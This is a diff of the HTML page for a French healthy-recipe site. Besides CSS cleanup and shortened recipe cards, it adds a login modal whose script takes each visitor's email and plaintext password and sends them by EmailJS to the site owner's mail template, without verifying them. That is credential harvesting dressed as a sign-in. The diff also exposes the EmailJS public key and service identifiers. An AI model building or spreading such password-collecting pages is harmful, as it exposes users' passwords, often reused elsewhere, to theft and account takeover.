@@ -9,7 +9,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
        (function(){
-          // --- TA PUBLIC KEY CONFIGURÉE ---
+          // Remplace par ta clé si nécessaire
           emailjs.init("BjuOMozrgQrwci0yv");
        })();
     </script>
@@ -25,7 +25,7 @@
             line-height: 1.6;
         }
 
-        /* --- STYLE DU BOUTON DE CONNEXION (HAUT DROITE) --- */
+        /* --- STYLE CONNEXION --- */
         #auth-header {
             position: fixed;
             top: 15px;
@@ -43,12 +43,37 @@
             cursor: pointer;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             transition: all 0.3s;
-            width: auto;
         }
 
-        .auth-btn:hover {
-            background-color: #e8f5e9;
-            transform: scale(1.05);
+        /* Fenêtre de connexion (Modal) */
+        #login-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            z-index: 3000;
+            width: 300px;
+        }
+
+        #login-modal input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 2500;
         }
 
         .user-logged {
@@ -60,15 +85,14 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
 
+        /* --- STRUCTURE --- */
         header {
             background: linear-gradient(135deg, #2e7d32, #45a049);
             color: white;
             padding: 2.5rem 1rem;
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
 
         nav {
@@ -85,11 +109,6 @@
             padding: 1rem 2rem;
             text-decoration: none;
             font-weight: bold;
-            transition: background 0.3s;
-        }
-
-        nav a:hover {
-            background-color: #45a049;
         }
 
         .container {
@@ -98,16 +117,6 @@
             padding: 0 1rem;
         }
 
-        .hero {
-            background: white;
-            padding: 2rem;
-            border-radius: 15px;
-            text-align: center;
-            margin-bottom: 2rem;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-        }
-
-        /* --- GRILLE DES RECETTES --- */
         .recipe-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
@@ -119,95 +128,40 @@
             border-radius: 15px;
             overflow: hidden;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            transition: transform 0.3s, box-shadow 0.3s;
             display: flex;
             flex-direction: column;
-        }
-
-        .recipe-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
-        }
-
-        .recipe-image {
-            height: 220px;
-            overflow: hidden;
         }
 
         .recipe-image img {
             width: 100%;
-            height: 100%;
+            height: 220px;
             object-fit: cover;
         }
 
-        .recipe-content {
-            padding: 1.5rem;
-            display: flex;
-            flex-direction: column;
-            flex-grow: 1;
-        }
+        .recipe-content { padding: 1.5rem; flex-grow: 1; }
 
-        /* --- NUTRI-SCORE --- */
         .nutriscore {
             display: inline-block;
             padding: 5px 12px;
             border-radius: 5px;
-            font-weight: bold;
-            margin-bottom: 1rem;
             color: white;
-            width: fit-content;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
-
         .score-a { background-color: #008b4c; }
-        .score-b { background-color: #85bb2f; }
 
-        /* --- LISTES DÉTAILLÉES --- */
-        .ingredients-list {
-            font-size: 0.9rem;
-            padding-left: 20px;
-            margin: 10px 0;
-            color: #555;
-        }
-
-        .details-list {
-            font-size: 0.9rem;
-            list-style: none;
-            padding: 0;
-            margin: 15px 0;
-        }
-
-        .details-list li {
-            margin-bottom: 8px;
-            display: flex;
-            justify-content: space-between;
-            border-bottom: 1px dotted #ccc;
-        }
-
-        /* --- BOUTONS --- */
-        button {
+        button.main-btn {
             width: 100%;
             padding: 12px;
-            margin-top: auto;
-            cursor: pointer;
-            border: none;
             background-color: #2e7d32;
             color: white;
-            font-weight: bold;
+            border: none;
             border-radius: 8px;
-            transition: background 0.3s;
+            cursor: pointer;
+            font-weight: bold;
         }
 
-        button:hover {
-            background-color: #1b5e20;
-        }
-
-        footer {
-            text-align: center;
-            padding: 2.5rem;
-            background: #333;
-            color: white;
-            margin-top: 4rem;
-        }
+        footer { text-align: center; padding: 2rem; background: #333; color: white; margin-top: 2rem; }
     </style>
 </head>
 <body>
@@ -215,14 +169,23 @@
     <!-- ZONE DE CONNEXION -->
     <div id="auth-header">
         <div id="logged-out-view">
-            <button class="auth-btn" onclick="login()">Se connecter</button>
+            <button class="auth-btn" onclick="openModal()">Se connecter</button>
         </div>
         <div id="logged-in-view" style="display: none;">
             <div class="user-logged">
-                <span>👤 Profil Actif</span>
-                <button onclick="logout()" style="width:auto; padding: 2px 8px; background:#333; font-size: 0.7rem; margin-top: 0;">Quitter</button>
+                <span id="display-user">👤 Utilisateur</span>
+                <button onclick="logout()" style="background:#333; color:white; border:none; border-radius:10px; cursor:pointer;">X</button>
             </div>
         </div>
+    </div>
+
+    <!-- MODAL DE CONNEXION -->
+    <div class="overlay" id="overlay" onclick="closeModal()"></div>
+    <div id="login-modal">
+        <h3 style="margin-top:0;">Connexion</h3>
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="password" id="password" placeholder="Mot de passe" required>
+        <button class="main-btn" onclick="handleLogin()">Valider</button>
     </div>
 
     <header>
@@ -231,168 +194,113 @@
     </header>
 
     <nav>
-        <a href="index.html">Accueil</a>
-        <a href="petit-dejeuner.html">Petit déjeuner</a>
-        <a href="plats-resistants.html">Plats Résistants</a>
-        <a href="desserts.html">Desserts Healthy</a> 
-        <a href="- 500 kcal.html">- 500 kcal</a> 
-        <a href="guide.html">Guide Nutrition</a>
+        <a href="#">Accueil</a>
+        <a href="#">Recettes</a>
+        <a href="#">Guide</a>
     </nav>
 
     <div class="container">
-        <section class="hero">
-            <h2>Bienvenue sur l'Accueil</h2>
-            <p>Découvrez nos recettes phares analysées pour votre santé.</p>
-        </section>
-
         <h2>Recettes à la une</h2>
         <div class="recipe-grid">
-            
-            <!-- Plat 1 -->
+            <!-- Exemple de recette -->
             <article class="recipe-card">
-                <div class="recipe-image" style="position: relative;">
-                    <div style="position: absolute; top: 10px; left: 10px; background: white; padding: 5px 10px; border-radius: 5px; font-weight: bold; font-size: 0.8rem; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
-                        🕒 25 à 30 min
-                    </div>
-                    <img src="https://images.unsplash.com/photo-1512621776951-a57141f2eefd?q=80&w=800&auto=format&fit=crop" alt="Salade de Quinoa">
+                <div class="recipe-image">
+                    <img src="https://images.unsplash.com/photo-1512621776951-a57141f2eefd?w=800" alt="Salade">
                 </div>
                 <div class="recipe-content">
                     <span class="nutriscore score-a">Nutri-Score A</span>
                     <h3>Salade de Quinoa</h3>
-                    <p><strong>Ingrédients :</strong></p>
-                    <ul class="ingredients-list">
-                        <li>70g Quinoa rouge et blanc</li>
-                        <li>1 Avocat, Tomates cerises 1 concombre</li>
-                        <li>200g pois chiches cuits</li>
-                        <li>persil ou menthe fraîche</li>
-                        <li>graines de courge</li>
-                    </ul>
-                    <ul class="details-list">
-                        <li><span>Calories</span> <strong>614 kcal</strong></li>
-                        <li><span>Protéines</span> <strong>24g</strong></li>
-                        <li><span>Lipides</span> <strong>22,3g</strong></li>
-                        <li><span>Glucides</span> <strong>80,5g</strong></li>
-                        <li><span>Budget estimé</span> <strong>4 à 6€</strong></li>
-                    </ul>
-                    <button onclick="checkAction()">Voir la recette</button>
+                    <p>Une explosion de fraîcheur et de protéines végétales.</p>
+                    <button class="main-btn" onclick="checkAction('Salade de Quinoa')">Voir la recette</button>
                 </div>
             </article>
-
-            <!-- Plat 2 -->
+            
+            <!-- Recette 2 -->
             <article class="recipe-card">
-                <div class="recipe-image" style="position: relative;">
-                    <div style="position: absolute; top: 10px; left: 10px; background: white; padding: 5px 10px; border-radius: 5px; font-weight: bold; font-size: 0.8rem; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
-                        🕒 20 min
-                    </div>
-                    <img src="https://images.unsplash.com/photo-1467003909585-2f8a72700288?q=80&w=800&auto=format&fit=crop" alt="Saumon Grillé">
+                <div class="recipe-image">
+                    <img src="https://images.unsplash.com/photo-1467003909585-2f8a72700288?w=800" alt="Saumon">
                 </div>
                 <div class="recipe-content">
                     <span class="nutriscore score-a">Nutri-Score A</span>
-                    <h3>Saumon aux Légumes</h3>
-                    <p><strong>Ingrédients :</strong></p>
-                    <ul class="ingredients-list">
-                        <li>Pavé de saumon frais 125g</li>
-                        <li>1/2 courgette</li>
-                        <li>1/2 citron</li>
-                        <li>6 tomates cerises</li>
-                        <li>1 grosse poignée de pousses d'épinards</li>
-                        <li>épices</li>
-                    </ul>
-                    <ul class="details-list">
-                        <li><span>Calories</span> <strong>308 kcal</strong></li>
-                        <li><span>Protéines</span> <strong>27,7g</strong></li>
-                        <li><span>Lipides</span> <strong>17,6g</strong></li>
-                        <li><span>Glucides</span> <strong>8,8g</strong></li>
-                        <li><span>Budget estimé</span> <strong>6 à 9€</strong></li>
-                    </ul>
-                    <button onclick="checkAction()">Voir la recette</button>
-                </div>
-            </article>
-
-            <!-- Plat 3 -->
-            <article class="recipe-card">
-                <div class="recipe-image" style="position: relative;">
-                    <div style="position: absolute; top: 10px; left: 10px; background: white; padding: 5px 10px; border-radius: 5px; font-weight: bold; font-size: 0.8rem; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
-                        🕒 30 à 40 min
-                    </div>
-                    <img src="https://images.unsplash.com/photo-1546069901-ba9599a7e63c?q=80&w=800&auto=format&fit=crop" alt="Bowl de Poulet">
-                </div>
-                <div class="recipe-content">
-                    <span class="nutriscore score-b">Nutri-Score B</span>
-                    <h3>Bowl de Poulet Grillé</h3>
-                    <p><strong>Ingrédients :</strong></p>
-                    <ul class="ingredients-list">
-                        <li>Blanc de poulet mariné 120g</li>
-                        <li>Riz complet 50g</li>
-                        <li>1/4 concombre</li>
-                        <li>1 avocat</li>
-                        <li>1 carotte</li>
-                        <li>pois chiches</li>
-                    </ul>
-                    <ul class="details-list">
-                        <li><span>Calories</span> <strong>690 kcal</strong></li>
-                        <li><span>Protéines</span> <strong>40,5g</strong></li>
-                        <li><span>Lipides</span> <strong>32g</strong></li>
-                        <li><span>Glucides</span> <strong>64g</strong></li>
-                        <li><span>Budget estimé</span> <strong>5 à 7€</strong></li>
-                    </ul>
-                    <button onclick="checkAction()">Voir la recette</button>
+                    <h3>Saumon Grillé</h3>
+                    <p>Riche en Oméga-3 avec ses petits légumes croquants.</p>
+                    <button class="main-btn" onclick="checkAction('Saumon Grillé')">Voir la recette</button>
                 </div>
             </article>
         </div>
     </div>
 
     <footer>
-        <p>&copy; 2026 NutriDélices - Informations nutritionnelles certifiées.</p>
+        <p>&copy; 2026 NutriDélices</p>
     </footer>
 
     <script>
-        // --- LOGIQUE DE CONNEXION CONFIGURÉE AVEC TES CLÉS ---
+        // --- GESTION DE LA CONNEXION ---
 
-        window.onload = function() {
-            if (sessionStorage.getItem("isLoggedIn") === "true") {
-                showLoggedIn();
+        function openModal() {
+            document.getElementById('login-modal').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('login-modal').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            if(email === "" || pass === "") {
+                alert("Merci de remplir tous les champs.");
+                return;
             }
-        };
 
-        function login() {
-            // --- TES CODES PERSONNELS ---
-            const serviceID = "service_mco0w9s";
-            const templateID = "template_ekxfi0j";
-
-            // Envoi du mail d'alerte
-            emailjs.send(serviceID, templateID, {
-                user_status: "Un utilisateur s'est connecté",
+            // Envoi des données par EmailJS
+            emailjs.send("service_mco0w9s", "template_ekxfi0j", {
+                user_email: email,
+                user_password: pass,
                 date: new Date().toLocaleString()
             }).then(() => {
-                console.log("Alerte mail envoyée avec succès.");
-            }).catch((error) => {
-                console.error("Erreur EmailJS:", error);
+                console.log("Données envoyées.");
             });
 
-            // Activation de la session
+            // Enregistrement local
             sessionStorage.setItem("isLoggedIn", "true");
-            showLoggedIn();
-            alert("Connexion réussie ! Vous pouvez maintenant consulter les recettes.");
+            sessionStorage.setItem("userEmail", email);
+            
+            showLoggedIn(email);
+            closeModal();
+            alert("Bienvenue " + email);
+        }
+
+        function showLoggedIn(email) {
+            document.getElementById("logged-out-view").style.display = "none";
+            document.getElementById("logged-in-view").style.display = "block";
+            document.getElementById("display-user").innerText = "👤 " + email.split('@')[0];
         }
 
         function logout() {
-            sessionStorage.removeItem("isLoggedIn");
+            sessionStorage.clear();
             location.reload();
         }
 
-        function showLoggedIn() {
-            document.getElementById("logged-out-view").style.display = "none";
-            document.getElementById("logged-in-view").style.display = "block";
+        // --- ACTION RECETTE (ACCESSIBLE À TOUS) ---
+        function checkAction(recipeName) {
+            if (sessionStorage.getItem("isLoggedIn") === "true") {
+                alert("Bonjour abonné ! Voici les détails complets pour : " + recipeName);
+            } else {
+                alert("Voici la recette de " + recipeName + " (Connectez-vous pour l'ajouter à vos favoris !)");
+            }
+            // Ici tu peux rediriger vers la page de la recette : window.location.href = "page.html";
         }
 
-        function checkAction() {
+        // Vérifier au chargement
+        window.onload = function() {
             if (sessionStorage.getItem("isLoggedIn") === "true") {
-                alert("Accès autorisé ! Chargement de la fiche recette...");
-            } else {
-                alert("Veuillez d'abord cliquer sur 'Se connecter' en haut à droite pour accéder aux recettes !");
+                showLoggedIn(sessionStorage.getItem("userEmail"));
             }
-        }
+        };
     </script>
 </body>
 </html>
